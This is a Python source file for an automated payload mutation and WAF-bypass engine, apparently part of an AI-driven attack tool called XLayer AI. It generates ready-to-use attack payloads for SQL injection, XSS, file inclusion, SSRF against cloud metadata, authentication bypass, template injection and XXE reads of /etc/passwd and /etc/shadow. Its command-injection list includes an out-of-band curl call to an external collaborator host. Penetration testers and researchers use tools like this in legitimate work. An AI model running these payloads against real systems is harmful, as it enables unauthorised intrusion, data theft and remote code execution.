"""
XLayer AI - Mutation Engine

Comprehensive, context-aware WAF bypass and payload mutation engine.
Covers ALL vulnerability types with maximum precision.

Decision tree logic:
  - AI reads ctx (filtered chars, keywords, WAF type, tech stack)
  - Selects mutation strategy accordingly
  - Returns deduplicated, priority-sorted mutation list

Mutation coverage:
  SQLi  → case_toggle, versioned_comment, inline_comment, hex_strings,
           double_char, scientific_notation, comment_sandwich, space_sub,
           extractvalue_bypass, plus_space, unicode_whitespace

  XSS   → tag_mutation, event_handler, base64_eval, template_injection,
           svg_vector, js_uri, null_byte_tag, html_entity, double_encode,
           css_expression, iframe_srcdoc, unicode_escape

  LFI   → double_dot, url_encode, double_url_encode, triple_url_encode,
           null_byte, php_filter_wrapper, php_data_wrapper, absolute_path,
           utf8_overlong, backslash, wrapper_chain, path_normalization

  SSRF  → ipv6_localhost, decimal_ip, octal_ip, hex_ip, cloud_metadata,
           dns_rebind, protocol_smuggle, loopback_variants, ipv4_mapped,
           redirect_bypass, ipv6_encoded

  Auth  → sqli_no_quote, nosql_operators, ldap_injection, type_juggling,
           parameter_pollution, case_variation, unicode_bypass,
           null_byte_truncation, double_url_encode, jwt_header_hints

Planned / possible additions:
  - Vuln types: RCE, XXE, SSTI, IDOR, command injection.
  - ctx.waf: use WAF type to pick strategy (e.g. ModSecurity vs Cloudflare).
  - SQLi: PostgreSQL/MSSQL/Oracle-specific bypasses.
  - LFI: Java / .NET wrappers (not only PHP).
  - Combination mutations: apply 2+ techniques in sequence.
  - Adaptive priority from get_failed_payloads() success rate.
"""

import base64
import re
import itertools
from dataclasses import dataclass, field
from typing import List, Optional, Dict, Tuple
from urllib.parse import quote, quote_plus, urlparse, urlunparse


# ─── MutationResult ───────────────────────────────────────────────────────────

@dataclass
class MutationResult:
    """A single mutated payload with metadata"""
    payload: str
    technique: str
    vuln_type: str
    priority: int = 5          # 1 = highest priority, 10 = lowest
    notes: str = ""


# ─── MutationEngine ───────────────────────────────────────────────────────────

class MutationEngine:
    """
    Context-aware payload mutation engine.

    Usage:
        engine = MutationEngine()
        mutations = engine.mutate(
            vuln_type="sqli",
            payloads=["' OR 1=1--", "' UNION SELECT NULL--"],
            ctx=attack_context         # AttackContext or None
        )
        # returns List[MutationResult] sorted by priority
    """

    # ── Dispatch ──────────────────────────────────────────────────────────────

    def mutate(
        self,
        vuln_type: str,
        payloads: List[str],
        ctx=None                        # AttackContext | None
    ) -> List[MutationResult]:
        """
        Main entry point.
        Returns deduplicated MutationResult list sorted by priority.
        """
        dispatch = {
            "sqli":  self._sqli_mutations,
            "xss":   self._xss_mutations,
            "lfi":   self._lfi_mutations,
            "ssrf":  self._ssrf_mutations,
            "auth":  self._auth_mutations,
            "ssti":  self._ssti_mutations,
            "rce":   self._rce_mutations,
            "xxe":   self._xxe_mutations,
        }

        fn = dispatch.get(vuln_type.lower())
        if fn is None:
            return []

        raw: List[MutationResult] = []
        for payload in payloads:
            raw.extend(fn(payload, ctx))

        # Deduplicate by payload string, prefer higher priority (lower number)
        seen: Dict[str, MutationResult] = {}
        for m in raw:
            if m.payload not in seen or m.priority < seen[m.payload].priority:
                seen[m.payload] = m

        # Remove payloads already tried
        if ctx is not None and hasattr(ctx, "get_failed_payloads"):
            failed = set(ctx.get_failed_payloads())
            seen = {k: v for k, v in seen.items() if k not in failed}

        result = sorted(seen.values(), key=lambda m: m.priority)
        # WAF-specific technique priority (Cloudflare vs ModSecurity)
        if ctx is not None and getattr(ctx, "waf", None):
            for m in result:
                m.priority = self._priority_for_waf(m.priority, m.technique, ctx.waf)
            result = sorted(result, key=lambda m: m.priority)
        return result

    def _priority_for_waf(self, base_priority: int, technique: str, waf: str) -> int:
        """Lower = try first. Cloudflare: hex, unicode, double-encode. ModSecurity: comment sandwich, versioned, space sub."""
        if not waf:
            return base_priority
        w = waf.lower()
        if "cloudflare" in w:
            if technique in ("hex_strings", "char_encoding", "unicode_whitespace", "url_encoded", "double_encode", "double_url_encode"):
                return max(1, base_priority - 2)
        if "modsecurity" in w or "mod_security" in w:
            if technique in ("comment_sandwich", "versioned_comment", "inline_comment_split", "space_comment", "space_tab", "space_newline", "space_plus"):
                return max(1, base_priority - 2)
        if "aws" in w:
            if technique in ("hex_strings", "unicode_whitespace", "url_encoded"):
                return max(1, base_priority - 1)
        return base_priority

    def mutate_to_strings(
        self,
        vuln_type: str,
        payloads: List[str],
        ctx=None,
        limit: Optional[int] = 30
    ) -> List[str]:
        """Convenience: returns plain payload strings, ordered by priority. Use limit=None for no cap."""
        mutations = self.mutate(vuln_type, payloads, ctx)
        if limit is None:
            return [m.payload for m in mutations]
        return [m.payload for m in mutations[:limit]]


    # ═══════════════════════════════════════════════════════════════════════════
    # ── SQLi Mutations ────────────────────────────────────────────────────────
    # ═══════════════════════════════════════════════════════════════════════════

    def _sqli_mutations(self, payload: str, ctx) -> List[MutationResult]:
        results = []
        vt = "sqli"

        filtered_chars = set(ctx.filtered_chars) if ctx else set()
        keywords_filtered = set(k.upper() for k in (ctx.keywords_filtered if ctx else []))
        waf = ctx.waf if ctx else None
        quotes_filtered = ctx.quotes_filtered if ctx else False

        # ── 1. Hex-encode all string literals (highest priority if quotes filtered)
        if quotes_filtered or "'" in filtered_chars or '"' in filtered_chars:
            hex_ver = _hex_encode_string_literals(payload)
            if hex_ver != payload:
                results.append(MutationResult(hex_ver, "hex_strings", vt, 1,
                    "All string literals replaced with 0x... hex"))

        # ── 2. CHAR() function encoding alternative
        if quotes_filtered:
            char_ver = _char_encode_string_literals(payload)
            if char_ver != payload:
                results.append(MutationResult(char_ver, "char_encoding", vt, 2,
                    "String literals encoded as CHAR(ascii,...) calls"))

        # ── 3. Space substitution variants
        for sub, label, pri in [
            ("/**/", "space_comment", 3),
            ("%09", "space_tab", 4),
            ("%0a", "space_newline", 4),
            ("%0d%0a", "space_crlf", 5),
            ("%0b", "space_vtab", 5),
            ("+", "space_plus", 4),
        ]:
            ver = payload.replace(" ", sub)
            if ver != payload:
                results.append(MutationResult(ver, label, vt, pri))

        # ── 4. Case toggle mutations on SQL keywords
        for original, toggled in _sqli_case_toggles(payload):
            if toggled != payload:
                results.append(MutationResult(toggled, "case_toggle", vt, 4))

        # ── 5. MySQL versioned comment (/*!50000KEYWORD*/)
        versioned = _apply_versioned_comments(payload)
        if versioned != payload:
            results.append(MutationResult(versioned, "versioned_comment", vt, 2,
                "Keywords wrapped in /*!50000...*/"))

        # ── 6. Inline comment split (UN/**/ION)
        inline = _inline_comment_split(payload)
        if inline != payload:
            results.append(MutationResult(inline, "inline_comment_split", vt, 3,
                "Keywords split with inline comments"))

        # ── 7. Double-char keyword bypass (UNION → UUNNIION)
        doubled = _double_char_keywords(payload)
        if doubled != payload:
            results.append(MutationResult(doubled, "double_char", vt, 3,
                "Each char in keyword doubled — bypasses single-strip WAFs"))

        # ── 8. Scientific notation for numeric values
        sci = _scientific_notation(payload)
        if sci != payload:
            results.append(MutationResult(sci, "scientific_notation", vt, 5,
                "Integers replaced with scientific notation (1 → 1e0)"))

        # ── 9. Comment sandwich (OR/*!*/1=1)
        sandwich = _comment_sandwich(payload)
        if sandwich != payload:
            results.append(MutationResult(sandwich, "comment_sandwich", vt, 4))

        # ── 10. EXTRACTVALUE bypass when UNION blocked
        if "UNION" in keywords_filtered or "UNION" in payload.upper():
            for ev in _extractvalue_variants(payload):
                results.append(MutationResult(ev, "extractvalue_bypass", vt, 2))

        # ── 11. Unicode whitespace
        uw = payload.replace(" ", "\u00a0")  # non-breaking space
        if uw != payload:
            results.append(MutationResult(uw, "unicode_whitespace", vt, 6))

        # ── 12. URL encode the whole payload
        url_enc = quote(payload)
        if url_enc != payload:
            results.append(MutationResult(url_enc, "url_encoded", vt, 6))

        # ── 13. Mixed versioned + case
        mixed = _apply_versioned_comments(_sqli_random_case(payload))
        if mixed != payload:
            results.append(MutationResult(mixed, "versioned_mixed_case", vt, 3))

        # ── 14. NULL byte after payload (some parsers stop at NULL)
        null_ver = payload + "%00"
        results.append(MutationResult(null_ver, "null_byte_suffix", vt, 6))

        return results


    # ═══════════════════════════════════════════════════════════════════════════
    # ── XSS Mutations ─────────────────────────────────────────────────────────
    # ═══════════════════════════════════════════════════════════════════════════

    def _xss_mutations(self, payload: str, ctx) -> List[MutationResult]:
        results = []
        vt = "xss"

        filtered_chars = set(ctx.filtered_chars) if ctx else set()
        waf = ctx.waf if ctx else None
        # When < or > blocked, prefer vectors that avoid angle brackets (entity, js:, etc.)
        angle_filtered = ("<" in filtered_chars or ">" in filtered_chars)
        pri_angle_safe = 1 if angle_filtered else 5  # boost priority for no-angle vectors

        # ── 1. Tag case mutations
        for mutated in _xss_tag_case_mutations(payload):
            if mutated != payload:
                results.append(MutationResult(mutated, "tag_mutation", vt, 2))

        # ── 2. Script tag alternatives (when <script> blocked)
        if "<script" in payload.lower() or angle_filtered:
            alts = _xss_script_alternatives()
            for alt in alts:
                results.append(MutationResult(alt, "event_handler", vt, 2))

        # ── 3. Base64 eval encoding (angle-safe if entity-decoded later)
        b64 = _xss_base64_eval(payload)
        if b64:
            results.append(MutationResult(b64, "base64_eval", vt, 3 if not angle_filtered else 2,
                "Payload encoded as base64 and eval(atob(...))"))

        # ── 4. Template injection variants (no angle brackets)
        for tmpl in _xss_template_injection():
            results.append(MutationResult(tmpl, "template_injection", vt, pri_angle_safe))

        # ── 5. SVG-based vectors
        for svg in _xss_svg_vectors():
            results.append(MutationResult(svg, "svg_vector", vt, 2))

        # ── 6. JavaScript URI variants (no angle brackets — high priority when < blocked)
        for js_uri in _xss_js_uri_variants():
            results.append(MutationResult(js_uri, "js_uri", vt, pri_angle_safe))

        # ── 7. Null byte tag bypass
        null_ver = _xss_null_byte(payload)
        if null_ver != payload:
            results.append(MutationResult(null_ver, "null_byte_tag", vt, 4))

        # ── 8. HTML entity encoding of angle brackets (top priority when < or > filtered)
        ent_ver = _xss_html_entity(payload)
        if ent_ver != payload:
            results.append(MutationResult(ent_ver, "html_entity", vt, 1 if angle_filtered else 5))

        # ── 9. Double URL encoding
        double_enc = quote(quote(payload))
        results.append(MutationResult(double_enc, "double_url_encode", vt, 5))

        # ── 10. CSS expression (IE legacy)
        for css in _xss_css_expression():
            results.append(MutationResult(css, "css_expression", vt, 6))

        # ── 11. Iframe srcdoc
        for iframe in _xss_iframe_srcdoc():
            results.append(MutationResult(iframe, "iframe_srcdoc", vt, 3))

        # ── 12. Unicode escape in script context
        if "alert" in payload.lower():
            uni = _xss_unicode_escape(payload)
            if uni != payload:
                results.append(MutationResult(uni, "unicode_escape", vt, 4))

        # ── 13. Event handler mutations (onerror, onload, etc.)
        for ev in _xss_event_handlers():
            results.append(MutationResult(ev, "event_handler_variation", vt, 2))

        # ── 14. Polyglot payloads
        for poly in _xss_polyglots():
            results.append(MutationResult(poly, "polyglot", vt, 3))

        # ── 15. Backtick as JS string delimiter
        if "alert(" in payload:
            bt = payload.replace("alert(1)", "alert`1`")
            if bt != payload:
                results.append(MutationResult(bt, "backtick_call", vt, 4))

        return results


    # ═══════════════════════════════════════════════════════════════════════════
    # ── LFI Mutations ─────────────────────────────────────────────────────────
    # ═══════════════════════════════════════════════════════════════════════════

    def _lfi_mutations(self, payload: str, ctx) -> List[MutationResult]:
        results = []
        vt = "lfi"

        server_os = "linux"
        if ctx and hasattr(ctx, "server"):
            if "windows" in (ctx.server or "").lower():
                server_os = "windows"

        # ── 1. Double-dot bypass (....// replaces ../)
        results.extend(_lfi_double_dot_variants(payload))

        # ── 2. URL encode (single)
        url1 = _lfi_url_encode(payload, single=True)
        if url1 != payload:
            results.append(MutationResult(url1, "url_encode", vt, 2))

        # ── 3. Double URL encode
        url2 = _lfi_url_encode(payload, double=True)
        if url2 != payload:
            results.append(MutationResult(url2, "double_url_encode", vt, 2))

        # ── 4. Triple URL encode
        url3 = _lfi_url_encode(payload, triple=True)
        if url3 != payload:
            results.append(MutationResult(url3, "triple_url_encode", vt, 3))

        # ── 5. Null byte injection
        for ext in ["%00", "%00.jpg", "%00.php", "%00.txt", "\x00"]:
            null_ver = payload.rstrip("/") + ext
            results.append(MutationResult(null_ver, "null_byte", vt, 3,
                f"Null byte suffix: {ext}"))

        # ── 6. PHP wrapper variants
        for wrapper in _lfi_php_wrappers(payload, server_os):
            results.append(MutationResult(wrapper, "php_wrapper", vt, 2))

        # ── 7. Absolute paths (OS-specific)
        for abs_path in _lfi_absolute_paths(server_os):
            results.append(MutationResult(abs_path, "absolute_path", vt, 2))

        # ── 8. UTF-8 overlong encoding (%c0%ae = `.`, %c0%af = `/`)
        overlong = _lfi_utf8_overlong(payload)
        if overlong != payload:
            results.append(MutationResult(overlong, "utf8_overlong", vt, 4))

        # ── 9. Backslash variants (Windows + confused parsers)
        bk = payload.replace("/", "\\")
        if bk != payload:
            results.append(MutationResult(bk, "backslash", vt, 4))

        # ── 10. Mixed slash
        mixed_slash = _lfi_mixed_slash(payload)
        if mixed_slash != payload:
            results.append(MutationResult(mixed_slash, "mixed_slash", vt, 5))

        # ── 11. Wrapper chain (zlib.deflate + base64)
        for wc in _lfi_wrapper_chain():
            results.append(MutationResult(wc, "wrapper_chain", vt, 3))

        # ── 12. Path normalization confusion
        norm = _lfi_path_normalization(payload)
        if norm != payload:
            results.append(MutationResult(norm, "path_normalization", vt, 5))

        # ── 13. Semicolon suffix
        semi_ver = payload.rstrip("/") + ";"
        results.append(MutationResult(semi_ver, "semicolon_suffix", vt, 6))

        # ── 14. Strip extension bypass (when app appends .php)
        for strip in _lfi_strip_extension(payload):
            if strip != payload:
                results.append(MutationResult(strip, "strip_extension", vt, 3))

        return results


    # ═══════════════════════════════════════════════════════════════════════════
    # ── SSRF Mutations ────────────────────────────────────────────────────────
    # ═══════════════════════════════════════════════════════════════════════════

    def _ssrf_mutations(self, payload: str, ctx) -> List[MutationResult]:
        results = []
        vt = "ssrf"

        # ── 0. Mutate user's URL (preserve path/query): host → decimal/octal/hex/IPv6
        for url, tech, pri in _ssrf_mutate_url_payload(payload):
            results.append(MutationResult(url, tech, vt, pri))

        # ── 1. IPv6 localhost variants
        for ipv6 in _ssrf_ipv6_variants():
            results.append(MutationResult(ipv6, "ipv6_localhost", vt, 1))

        # ── 2. Decimal IP encoding (127.0.0.1 → 2130706433)
        for dec in _ssrf_decimal_ip_variants():
            results.append(MutationResult(dec, "decimal_ip", vt, 2))

        # ── 3. Octal IP encoding
        for oct_ip in _ssrf_octal_ip_variants():
            results.append(MutationResult(oct_ip, "octal_ip", vt, 2))

        # ── 4. Hex IP encoding
        for hex_ip in _ssrf_hex_ip_variants():
            results.append(MutationResult(hex_ip, "hex_ip", vt, 2))

        # ── 5. Cloud metadata endpoints
        for meta in _ssrf_cloud_metadata():
            results.append(MutationResult(meta, "cloud_metadata", vt, 1))

        # ── 6. DNS rebind / CNAME tricks
        for dns in _ssrf_dns_rebind():
            results.append(MutationResult(dns, "dns_rebind", vt, 3))

        # ── 7. Protocol smuggling
        for proto in _ssrf_protocol_smuggling():
            results.append(MutationResult(proto, "protocol_smuggle", vt, 3))

        # ── 8. Loopback variants
        for loop in _ssrf_loopback_variants():
            results.append(MutationResult(loop, "loopback_variant", vt, 2))

        # ── 9. IPv4-mapped IPv6 for metadata IP
        for mapped in _ssrf_ipv4_mapped():
            results.append(MutationResult(mapped, "ipv4_mapped", vt, 3))

        # ── 10. URL at-sign bypass (@)
        for at in _ssrf_at_sign_bypass(payload):
            if at != payload:
                results.append(MutationResult(at, "at_sign_bypass", vt, 3))

        # ── 11. URL scheme case
        if payload.startswith("http://") or payload.startswith("https://"):
            for case_url in _ssrf_scheme_case(payload):
                if case_url != payload:
                    results.append(MutationResult(case_url, "scheme_case", vt, 5))

        # ── 12. Open redirect chaining
        for redir in _ssrf_redirect_bypass(payload):
            results.append(MutationResult(redir, "redirect_bypass", vt, 4))

        return results


    # ═══════════════════════════════════════════════════════════════════════════
    # ── Auth Mutations ────────────────────────────────────────────────────────
    # ═══════════════════════════════════════════════════════════════════════════

    def _auth_mutations(self, payload: str, ctx) -> List[MutationResult]:
        results = []
        vt = "auth"

        quotes_filtered = ctx.quotes_filtered if ctx else False
        filtered_chars = set(ctx.filtered_chars) if ctx else set()

        # ── 1. SQLi no-quote bypass
        for sqli in _auth_sqli_no_quote():
            results.append(MutationResult(sqli, "sqli_no_quote", vt, 1))

        # ── 2. SQLi hex bypass
        for sqli_hex in _auth_sqli_hex():
            results.append(MutationResult(sqli_hex, "sqli_hex", vt, 2))

        # ── 3. NoSQL operator injection (MongoDB)
        for nosql in _auth_nosql_operators():
            results.append(MutationResult(nosql, "nosql_operator", vt, 1))

        # ── 4. LDAP injection
        for ldap in _auth_ldap_injection():
            results.append(MutationResult(ldap, "ldap_injection", vt, 2))

        # ── 5. Type juggling (PHP loose comparison)
        for tj in _auth_type_juggling():
            results.append(MutationResult(tj, "type_juggling", vt, 3))

        # ── 6. Parameter pollution
        for pp in _auth_parameter_pollution(payload):
            results.append(MutationResult(pp, "parameter_pollution", vt, 3))

        # ── 7. Case variation of username (from payload or fallback "admin")
        username = _auth_username_from_payload(payload)
        for case_var in _auth_case_variations(username):
            results.append(MutationResult(case_var, "case_variation", vt, 4))

        # ── 8. Unicode full-width / homoglyph bypass for username
        for uni in _auth_unicode_bypass(username):
            results.append(MutationResult(uni, "unicode_bypass", vt, 5))

        # ── 9. Null byte truncation
        null_ver = payload + "%00"
        results.append(MutationResult(null_ver, "null_byte_truncation", vt, 4))

        # ── 10. Double URL encode
        double_enc = quote(quote(payload))
        results.append(MutationResult(double_enc, "double_url_encode", vt, 5))

        # ── 11. JWT hints (algorithm confusion)
        for jwt in _auth_jwt_hints():
            results.append(MutationResult(jwt, "jwt_algorithm_hint", vt, 4))

        # ── 12. SQL comment-based bypass
        for comment in _auth_comment_bypass():
            results.append(MutationResult(comment, "comment_bypass", vt, 2))

        return results


    # ═══════════════════════════════════════════════════════════════════════════
    # ── SSTI Mutations ────────────────────────────────────────────────────────
    # ═══════════════════════════════════════════════════════════════════════════

    def _ssti_mutations(self, payload: str, ctx) -> List[MutationResult]:
        results = []
        vt = "ssti"

        filtered_chars = set(ctx.filtered_chars) if ctx else set()

        # Detection probes — one per engine family
        engine_probes = [
            ("{{7*7}}",             "jinja2_detect",    1),
            ("{{7*'7'}}",           "twig_detect",      1),
            ("${7*7}",              "freemarker_detect", 1),
            ("${{7*7}}",            "mako_detect",      2),
            ("#{7*7}",              "ruby_detect",      2),
            ("<%= 7*7 %>",          "erb_detect",       2),
            ("{7*7}",               "velocity_detect",  3),
            # Polyglot: triggers multiple engines simultaneously
            ("${{<%[%'\"}}%>",      "polyglot",         1),
        ]

        # Jinja2 class traversal (Python RCE path)
        jinja2_exploits = [
            ("{{config}}",                                     "jinja2_config",     3),
            ("{{request.environ}}",                            "jinja2_environ",    3),
            ("{{''.__class__.__mro__}}",                       "jinja2_mro",        4),
            ("{{''.__class__.__mro__[1].__subclasses__()}}",   "jinja2_subclasses", 4),
        ]

        # Freemarker exploits
        freemarker_exploits = [
            ('<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}',
             "freemarker_exec", 3),
        ]

        all_probes = engine_probes + jinja2_exploits + freemarker_exploits

        for probe_str, technique, priority in all_probes:
            # Deprioritize payloads that use filtered chars (don't skip entirely)
            if any(c in probe_str for c in filtered_chars):
                priority += 3
            # Standalone probe
            results.append(MutationResult(probe_str, technique, vt, priority))
            # Injected into base payload context
            combined = f"{payload}{probe_str}"
            if combined != probe_str:
                results.append(MutationResult(combined, f"{technique}_ctx", vt, priority + 1))

        return results


    # ═══════════════════════════════════════════════════════════════════════════
    # ── RCE Mutations ─────────────────────────────────────────────────────────
    # ═══════════════════════════════════════════════════════════════════════════

    def _rce_mutations(self, payload: str, ctx) -> List[MutationResult]:
        results = []
        vt = "rce"

        filtered_chars = set(ctx.filtered_chars) if ctx else set()

        # (suffix, technique_label, base_priority)
        separators = [
            ("; id",       "semicolon",      1),
            ("|id",        "pipe",           1),
            ("&&id",       "and_chain",      2),
            ("||id",       "or_chain",       2),
            ("\nid",       "newline",        2),
            ("\r\nid",     "crlf",           3),
            ("`id`",       "backtick",       2),
            ("$(id)",      "subshell",       2),
            ("%0aid",      "url_newline",    2),
            ("%3bid",      "url_semicolon",  2),
            (";whoami",    "semicolon_who",  2),
            ("|whoami",    "pipe_who",       2),
            # Blind OOB via DNS lookup
            ("; nslookup xlayer.burpcollaborator.net",  "oob_dns",   4),
            ("|curl http://xlayer.burpcollaborator.net", "oob_curl", 4),
        ]

        for suffix, technique, priority in separators:
            # Deprioritize if filtered chars appear in separator
            if any(c in suffix for c in filtered_chars):
                priority += 3
            results.append(MutationResult(
                f"{payload}{suffix}", technique, vt, priority
            ))

        # WAF evasion variants — space substitution in commands
        space_subs = [("%09", "tab"), ("%20", "encoded_space"), ("${IFS}", "ifs")]
        for sep, label in space_subs:
            results.append(MutationResult(
                f"{payload};{sep}id",
                f"cmd_{label}",
                vt, 3,
                f"Command separator with {label} space substitute"
            ))

        return results


    # ═══════════════════════════════════════════════════════════════════════════
    # ── XXE Mutations ─────────────────────────────────────────────────────────
    # ═══════════════════════════════════════════════════════════════════════════

    def _xxe_mutations(self, payload: str, ctx) -> List[MutationResult]:
        """
        XXE payloads are largely standalone — the base payload is not mutated
        because XXE requires full XML document structure.
        """
        results = []
        vt = "xxe"

        xxe_payloads = [
            (
                '<?xml version="1.0"?>'
                '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
                '<r>&xxe;</r>',
                "classic_file_read", 1,
            ),
            (
                '<?xml version="1.0"?>'
                '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/shadow">]>'
                '<r>&xxe;</r>',
                "shadow_read", 2,
            ),
            (
                '<?xml version="1.0"?>'
                '<!DOCTYPE r [<!ENTITY xxe SYSTEM "http://127.0.0.1/">]>'
                '<r>&xxe;</r>',
                "xxe_ssrf", 2,
            ),
            (
                '<?xml version="1.0"?>'
                '<!DOCTYPE r [<!ENTITY % xxe SYSTEM "http://xlayer.burpcollaborator.net/evil.dtd"> %xxe;]>'
                '<r/>',
                "xxe_oob_dtd", 2,
            ),
            (
                '<?xml version="1.0"?>'
                '<!DOCTYPE r [<!ENTITY xxe SYSTEM '
                '"php://filter/convert.base64-encode/resource=/etc/passwd">]>'
                '<r>&xxe;</r>',
                "php_filter_wrapper", 3,
            ),
            (
                '<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
                '<xi:include parse="text" href="file:///etc/passwd"/></foo>',
                "xinclude", 2,
            ),
            # Windows-specific
            (
                '<?xml version="1.0"?>'
                '<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
                '<r>&xxe;</r>',
                "windows_file_read", 3,
            ),
        ]

        for p, technique, priority in xxe_payloads:
            results.append(MutationResult(p, technique, vt, priority))

        return results


# ═══════════════════════════════════════════════════════════════════════════════
# ── Helper Functions — SQLi ──────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

SQL_KEYWORDS = ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "INSERT",
                "UPDATE", "DELETE", "DROP", "EXEC", "EXECUTE", "CAST",
                "CONVERT", "CONCAT", "SLEEP", "WAITFOR", "BENCHMARK",
                "EXTRACTVALUE", "UPDATEXML", "GROUP", "BY", "ORDER",
                "HAVING", "LIMIT", "OFFSET", "INTO", "OUTFILE", "LOAD_FILE"]


def _hex_encode_string_literals(payload: str) -> str:
    """Replace 'string' and "string" with 0xhex equivalent"""
    def replace_match(m):
        s = m.group(1) if m.group(1) is not None else m.group(2)
        return "0x" + s.encode().hex()
    return re.sub(r"'([^']*)'|\"([^\"]*)\"", replace_match, payload)


def _char_encode_string_literals(payload: str) -> str:
    """Replace 'string' with CHAR(ascii1,ascii2,...) calls"""
    def replace_match(m):
        s = m.group(1) if m.group(1) is not None else m.group(2)
        codes = ",".join(str(ord(c)) for c in s)
        return f"CHAR({codes})"
    return re.sub(r"'([^']*)'|\"([^\"]*)\"", replace_match, payload)


def _sqli_case_toggles(payload: str) -> List[Tuple[str, str]]:
    """Generate case-toggled variants of SQL keywords in payload"""
    variants = []
    for kw in SQL_KEYWORDS:
        if kw.upper() in payload.upper():
            # alternating case: SeLeCt
            alt = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(kw))
            new_payload = re.sub(kw, alt, payload, flags=re.IGNORECASE)
            variants.append((kw, new_payload))
            # reverse alternating: sElEcT
            alt2 = "".join(c.lower() if i % 2 == 0 else c.upper() for i, c in enumerate(kw))
            new_payload2 = re.sub(kw, alt2, payload, flags=re.IGNORECASE)
            variants.append((kw, new_payload2))
    return variants


def _sqli_random_case(payload: str) -> str:
    """Apply random case to all SQL keywords"""
    result = payload
    for kw in SQL_KEYWORDS:
        if kw.upper() in result.upper():
            # Use alternating case
            alt = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(kw))
            result = re.sub(kw, alt, result, flags=re.IGNORECASE, count=1)
    return result


def _apply_versioned_comments(payload: str) -> str:
    """Wrap SQL keywords in MySQL versioned comments /*!50000KEYWORD*/"""
    result = payload
    for kw in ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "ORDER", "GROUP", "HAVING"]:
        if kw in result.upper():
            result = re.sub(
                r'\b' + kw + r'\b',
                f"/*!50000{kw}*/",
                result,
                flags=re.IGNORECASE
            )
    return result


def _inline_comment_split(payload: str) -> str:
    """Split keywords with inline comments: UNION → UN/**/ION"""
    result = payload
    for kw in ["UNION", "SELECT", "FROM", "WHERE", "AND", "OR", "EXEC"]:
        if kw in result.upper():
            mid = len(kw) // 2
            split = kw[:mid] + "/**/" + kw[mid:]
            result = re.sub(r'\b' + kw + r'\b', split, result, flags=re.IGNORECASE)
    return result


def _double_char_keywords(payload: str) -> str:
    """Double each character in keywords: UNION → UUNNIION"""
    result = payload
    # Only apply to longer keywords to avoid corrupting short ones
    for kw in ["UNION", "SELECT", "INSERT", "DELETE", "UPDATE", "EXEC"]:
        if kw in result.upper():
            doubled = "".join(c + c for c in kw)
            result = re.sub(r'\b' + kw + r'\b', doubled, result, flags=re.IGNORECASE)
    return result


def _scientific_notation(payload: str) -> str:
    """Replace standalone integers with scientific notation (1 → 1e0)"""
    return re.sub(r'\b(\d+)\b', lambda m: f"{m.group(1)}e0", payload)


def _comment_sandwich(payload: str) -> str:
    """Wrap operators: OR 1=1 → OR/*!*/1=1"""
    result = payload
    result = re.sub(r'\bOR\b', "OR/*!*/", result, flags=re.IGNORECASE)
    result = re.sub(r'\bAND\b', "AND/*!*/", result, flags=re.IGNORECASE)
    return result


def _extractvalue_variants(original: str) -> List[str]:
    """EXTRACTVALUE error-based extraction variants (avoids UNION)"""
    return [
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT version())))--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT database())))--",
        "' AND UPDATEXML(1,CONCAT(0x7e,(SELECT version()),0x7e),1)--",
        "' AND EXTRACTVALUE(1,CONCAT(0x7e,(SELECT user())))--",
        "1' AND EXTRACTVALUE(rand(),CONCAT(0x3a,(SELECT version())))--",
    ]


# ═══════════════════════════════════════════════════════════════════════════════
# ── Helper Functions — XSS ────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _xss_tag_case_mutations(payload: str) -> List[str]:
    """Generate case mutations of script/svg/img tags"""
    mutations = []
    tag_patterns = ["script", "img", "svg", "body", "iframe", "input", "details"]
    for tag in tag_patterns:
        if tag in payload.lower():
            # All upper
            mutations.append(re.sub(tag, tag.upper(), payload, flags=re.IGNORECASE))
            # Mixed case
            mixed = "".join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(tag))
            mutations.append(re.sub(tag, mixed, payload, flags=re.IGNORECASE))
    return mutations


def _xss_script_alternatives() -> List[str]:
    """Alternative XSS vectors that don't use <script>"""
    return [
        '<img src=x onerror=alert(1)>',
        '<img src=x onerror=alert`1`>',
        '<svg onload=alert(1)>',
        '<svg><script>alert(1)</script></svg>',
        '<body onload=alert(1)>',
        '<input autofocus onfocus=alert(1)>',
        '<details open ontoggle=alert(1)>',
        '<video src=x onerror=alert(1)>',
        '<audio src=x onerror=alert(1)>',
        '<object data="javascript:alert(1)">',
        '<embed src="javascript:alert(1)">',
        '<math><mtext></mtext><mglyph><svg><mtext></mtext><svg onload=alert(1)>',
        '<table background="javascript:alert(1)">',
        '"><svg/onload=alert(1)>',
        "';alert(1)//",
        '\';alert(1)//',
        '<marquee onstart=alert(1)>',
        '<select onfocus=alert(1) autofocus>',
    ]


def _xss_base64_eval(payload: str) -> Optional[str]:
    """Encode JS payload in base64 for eval(atob(...))"""
    # Extract the JS payload from common patterns
    match = re.search(r'alert\s*[\(`].*?[\)`]', payload, re.IGNORECASE)
    if match:
        js_code = match.group(0)
    else:
        js_code = "alert(1)"

    b64 = base64.b64encode(js_code.encode()).decode()
    return f'<script>eval(atob("{b64}"))</script>'


def _xss_template_injection() -> List[str]:
    """Template engine injection payloads (Jinja2, Freemarker, Pebble, etc.)"""
    return [
        "{{7*7}}",
        "${7*7}",
        "#{7*7}",
        "<%= 7*7 %>",
        "{{config}}",
        "${''.__class__.__mro__[2].__subclasses__()}",
        "{% for x in ().__class__.__base__.__subclasses__() %}{% if \"warning\" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen(\"id\").read()}}{% endif %}{% endfor %}",
        "${\"freemarker.template.utility.Execute\"?new()(\"id\")}",
        "{{''.__class__.mro()[1].__subclasses__()}}",
    ]


def _xss_svg_vectors() -> List[str]:
    """SVG-based XSS vectors"""
    return [
        '<svg onload=alert(1)>',
        '<svg/onload=alert(1)>',
